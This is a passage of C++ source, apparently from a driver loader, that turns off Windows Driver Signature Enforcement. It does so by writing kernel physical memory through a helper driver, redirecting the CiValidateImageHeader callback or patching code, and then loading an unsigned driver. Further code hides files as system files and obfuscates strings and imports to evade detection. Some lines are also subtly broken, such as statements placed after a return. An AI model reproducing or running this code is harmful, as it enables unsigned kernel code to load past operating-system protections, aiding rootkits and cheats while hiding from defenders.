			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}

		printf("[*] Replacing with ZwFlushInstructionCache: 0x%llX\n", replacement_cb_va);
		fflush(stdout);

		if (!write_phys(patch_pa_1, (u64)&replacement_cb_va, sizeof(u64))) {
			printf("[!] Failed to write CiValidateImageHeader callback.\n");
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}

		// Read-back verification: confirm write took effect
		u64 verify_cb = 0;
		read_phys(patch_pa_1, (u64)&verify_cb, sizeof(u64));
		if (verify_cb != replacement_cb_va) {
			printf("[!] Callback write didn't take effect (read back 0x%llX, expected 0x%llX).\n",
				verify_cb, replacement_cb_va);
			// Attempt to restore original
			write_phys(patch_pa_1, (u64)&orig_ci_header_cb, sizeof(u64));
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}

		printf("[+] SeCiCallbacks.CiValidateImageHeader -> ZwFlushInstructionCache (DSE disabled).\n");
	} else {
		// Function prologue approach: overwrite with 'mov eax, 0; ret'
		read_phys(patch_pa_1, (u64)&dse_original_1, sizeof(dse_original_1));
		if (patch_pa_2)
			read_phys(patch_pa_2, (u64)&dse_original_2, sizeof(dse_original_2));

		fflush(stdout);
		if (!write_phys(patch_pa_1, (u64)&patch, sizeof(patch))) {
			printf("[!] failed to write DSE patch 1.\n");
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}
		if (patch_pa_2 && !write_phys(patch_pa_2, (u64)&patch, sizeof(patch))) {
			printf("[!] failed to write DSE patch 2.\n");
			write_phys(patch_pa_1, (u64)&dse_original_1, sizeof(dse_original_1));
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}
	}

	// Load the target driver via SCM with the provided service name
	char full_driver[MAX_PATH] = {};
	GetFullPathNameA(DriverPath, MAX_PATH, full_driver, nullptr);
	bool driver_loaded = load_driver_scm(ServiceName, full_driver);
	DWORD load_error = GetLastError();

	// Restore original values IMMEDIATELY (even if load failed)
	if (g_CiOptions_mode) {
		write_phys(patch_pa_1, (u64)&g_CiOptions_original, sizeof(g_CiOptions_original));
		printf("[+] g_CiOptions restored to 0x%X.\n", g_CiOptions_original);
	} else if (SeCiCallbacks_mode) {
		write_phys(patch_pa_1, (u64)&orig_ci_header_cb, sizeof(u64));
		printf("[+] SeCiCallbacks.CiValidateImageHeader restored.\n");
	} else {
		write_phys(patch_pa_1, (u64)&dse_original_1, sizeof(dse_original_1));
		if (patch_pa_2)
			write_phys(patch_pa_2, (u64)&dse_original_2, sizeof(dse_original_2));
	}
	g_CiOptions_mode = false;
	SeCiCallbacks_mode = false;

	// Clean up CorMem
	cleanup_cormem_device();
	unload_driver_scm(cormem_svc_name.c_str());

	if (!driver_loaded) {
		printf("[!] failed to start driver service (error %lu).\n", load_error);
		unload_driver_scm(ServiceName);
		return;
	}

	Sleep(200);
	printf("[+] Driver loaded successfully.\n");
	Sleep(200);
}

void windows_service(const char* driver_path, const char* cormem_sys_path)
{
	std::string svc_name = GenerateRandomString(10);
	LoadDriverWithDSEBypass(driver_path, svc_name.c_str(), cormem_sys_path);
}

void CreateFileWithinBytes(const char* FilePath, std::vector<uint8_t> bytes)
{
	std::ofstream file(FilePath, std::ios_base::out | std::ios_base::binary);
	file.write((char*)bytes.data(), bytes.size());
	file.close();
}

void EncryptFilePath(const char* path)
{
	LI_FN(SetFileAttributesA)(path, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
}

int GenRandNum(int min, int max) {
	std::random_device rd;
	std::mt19937 gen(rd());

	std::uniform_int_distribution<> distribution(min, max);

	return distribution(gen);
}

std::string GenerateRandomFileName(const char* extension)
{
	auto TEMPString = skCrypt("TEMP"); TEMPString.encrypt();

	auto dashSymbol = skCrypt("-"); dashSymbol.encrypt();
	auto doubleSlashSymbol = skCrypt("\\"); doubleSlashSymbol.encrypt();

	std::string randomFileName;
	randomFileName.append(std::to_string(GenRandNum(1111111111, 9999999999)));
	randomFileName.append(dashSymbol.decrypt()); dashSymbol.encrypt();
	randomFileName.append(std::to_string(GenRandNum(1111111111, 9999999999)));
	randomFileName.append(dashSymbol.decrypt()); dashSymbol.encrypt();
	randomFileName.append(std::to_string(GenRandNum(11111111, 99999999)));
	randomFileName.append(dashSymbol.decrypt()); dashSymbol.encrypt();
	randomFileName.append(std::to_string(GenRandNum(1111111111, 9999999999)));
	randomFileName.append(extension);

	return std::getenv(TEMPString.decrypt()) + std::string(doubleSlashSymbol.decrypt()) + randomFileName; TEMPString.encrypt(); doubleSlashSymbol.encrypt();
}
